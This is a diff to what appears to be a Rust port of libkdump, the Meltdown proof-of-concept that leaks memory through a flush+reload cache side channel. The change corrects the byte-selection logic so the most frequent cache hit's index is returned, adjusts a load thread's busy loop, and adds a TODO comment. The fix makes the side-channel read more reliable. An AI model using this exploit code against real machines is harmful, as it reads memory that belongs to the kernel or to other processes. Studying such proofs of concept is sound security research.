@@ -157,9 +157,17 @@ pub fn libkdump_read(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPa
 		res_stat[r] += 1;
 	}
 	
-	let max_i = *res_stat.iter().max().expect("Couldn't find maximum!");
-	if max_i > config.accept_after {
-		max_i
+	let mut max_i = 0;
+	let mut max_v = res_stat[max_i];
+	for (i, v) in res_stat.iter().enumerate() {
+		if *v > max_v {
+			max_i = i;
+			max_v = *v;
+		}
+	}
+
+	if res_stat[max_i] > config.accept_after {
+		max_i as u32
 	} else {
 		0
 	}
@@ -201,7 +209,7 @@ pub fn detect_flush_reload_threshold(pointer: *const MemoryPage) -> u64{
 fn load_thread() {
 	let thread = thread::current().expect("Can't get current thread!");
 	loop {
-		for _ in 0..1000000 {}
+		for _ in 0..10000000 {}
 		print!("{}", thread.id());
 	}
 }
@@ -260,6 +268,7 @@ pub fn main() {
 	println!("Secret {} at address {:?}", SECRET, SECRET.as_ptr());
 	
 	for i in 0..3 {
+		// TODO: Find out why load threads are used in the original
 		thread::create(load_thread);
 		println!("Started load_thread {}!", i);
 	}
